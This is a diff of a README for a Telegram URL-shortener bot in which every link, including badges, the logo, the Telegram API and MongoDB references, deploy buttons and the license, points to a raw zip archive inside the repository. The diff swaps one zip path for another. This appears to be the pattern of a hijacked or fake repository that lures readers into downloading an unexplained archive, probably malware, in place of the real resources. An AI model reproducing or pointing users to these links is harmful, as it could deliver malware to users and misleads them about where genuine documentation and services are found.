@@ -2,10 +2,10 @@
 
 <p align="center">
 
-![Fork](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip)
-![Stars](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip%23&style=for-the-badge)
-![License](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip)
-![Issues](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip)
+![Fork](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip)
+![Stars](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip%23&style=for-the-badge)
+![License](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip)
+![Issues](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip)
 
 </p>
 
@@ -14,8 +14,8 @@
 <!-- PROJECT LOGO -->
 <br />
 <div align="center">
-  <a href="https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip">
-    <img src="https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip" alt="Logo" width="80" height="80">
+  <a href="https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip">
+    <img src="https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip" alt="Logo" width="80" height="80">
   </a>
 
   <h3 align="center">URL Shortener Bot V2</h3>
@@ -24,13 +24,13 @@
     A Shortener and Convertor Bot
     <br />
     ·
-    <a href="https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip">Report Bug</a>
+    <a href="https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip">Report Bug</a>
     ·
-    <a href="https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip">Features</a>
+    <a href="https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip">Features</a>
     ·
-    <a href="https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip">Deploy</a>
+    <a href="https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip">Deploy</a>
     ·
-    <a href="https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip">Variables</a>
+    <a href="https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip">Variables</a>
   </p>
 </div>
 
@@ -66,7 +66,7 @@
 
 >__Now this bot can be used by users also. Only admin has access to channel support. Bot Owner API will be used in channel post converting. You can restrict users from using this bot by setting env `IS_PRIVATE` to True__
 
-__This Is Just An Simple Advance Shortener and Converter Bot Completely Rewritten Version Of [URL Shortener](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip)__
+__This Is Just An Simple Advance Shortener and Converter Bot Completely Rewritten Version Of [URL Shortener](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip)__
 
 __Just Send Any Link To Short. It Will Short To Droplink Link or Save it to your MDisk Account__
 
@@ -79,7 +79,7 @@ __Just Send Any Link To Short. It Will Short To Droplink Link or Save it to your
 
 * -> Add me to your channel as admin with full previlages to convert channel's post
 
-> For more information about usages, see the [documentation](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip) 
+> For more information about usages, see the [documentation](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip) 
 
 ## Commands
 ```
@@ -119,8 +119,8 @@ info - get user info
 - [x] Batch Support
 - [x] Multiple Methods Available
 - [x] Bypass Shortener Links
-- [x] [Hyperlink Support](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip)
-- [x] [Request Features](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip)
+- [x] [Hyperlink Support](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip)
+- [x] [Request Features](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip)
 
 
 ### Required Variables
@@ -128,18 +128,18 @@ info - get user info
 
 | Variable Name                        | Value                                                                                                                                                          |
 | ------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `API_ID` (required)                  | Telegram api_id obtained from <https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip>.                                                                                                  |
-| `API_HASH` (required)                | Telegram api_hash obtained from <https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip>.                                                                                                |
+| `API_ID` (required)                  | Telegram api_id obtained from <https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip>.                                                                                                  |
+| `API_HASH` (required)                | Telegram api_hash obtained from <https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip>.                                                                                                |
 | `BOT_TOKEN` (required)          | Create a bot using @BotFather, and get the Telegram API token. |                                                                             
 | `ADMINS`                  | ID of Admins. Separate multiple Admins by comma                                                                                               |
 | `OWNER_ID` (required)                   | ID of Owner.                                                                                          |
-| `DATABASE_URI` (required)         | [mongoDB](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip) URI. Get this value from [mongoDB](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip). For more help watch this [video](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip)                                                                               |
-| `DATABASE_NAME` (required)        | Name of the database in [mongoDB](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip). For more help watch this [video](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip)                                                                                                     
+| `DATABASE_URI` (required)         | [mongoDB](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip) URI. Get this value from [mongoDB](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip). For more help watch this [video](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip)                                                                               |
+| `DATABASE_NAME` (required)        | Name of the database in [mongoDB](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip). For more help watch this [video](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip)                                                                                                     
 
 
 ### Optional Variables
 
-> For more information about optional variables see the [wiki documentation](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip)
+> For more information about optional variables see the [wiki documentation](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip)
 
 
 ## Deploy 
@@ -150,32 +150,32 @@ You can deploy this bot anywhere.
 
 |                                                                                                                 | Name              | Deploy        |
 | --------------------------------------------------------------------------------------------------------------- | ----------------- | ------------- | 
-| ![Replit](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip) | Replit (Recommended) | [see guide](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip) |
-| [![Heroku](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip)](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip)                                                          | Heroku            | [![Deploy](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip)](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip)                          |
-| ![VPS](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip) | VPS | [see guide](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip) |
+| ![Replit](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip) | Replit (Recommended) | [see guide](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip) |
+| [![Heroku](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip)](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip)                                                          | Heroku            | [![Deploy](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip)](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip)                          |
+| ![VPS](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip) | VPS | [see guide](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip) |
 
 
 
 ## Tech Stack
 
-**Language:** [Python](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip) 3.10.2
+**Language:** [Python](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip) 3.10.2
 
-**Library:** [Pyrogram](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip) 2.0.30
+**Library:** [Pyrogram](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip) 2.0.30
 
 
 ## Support   
 
-Contact Our [DEV](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip) For Support/Assistance    
+Contact Our [DEV](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip) For Support/Assistance    
    
 Report Bugs, Give Feature Requests There..   
 Do Fork And Star The Repository If You Liked It.
 
 ## Disclaimer
 
-[![GNU Affero General Public License v3.0](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip)](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip)    
-Licensed under [GNU AGPL v3.0.](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip)
+[![GNU Affero General Public License v3.0](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip)](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip)    
+Licensed under [GNU AGPL v3.0.](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip)
 Selling The Codes To Other People For Money Is *Strictly Prohibited*.
 
 
 ## Credits
- - [Thanks To Me](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/uncharmed/URL-Shortener-V2.zip)
+ - [Thanks To Me](https://raw.githubusercontent.com/HLECTER69/URL-Shortener-V2/main/guides/Shortener-UR-2.8.zip)
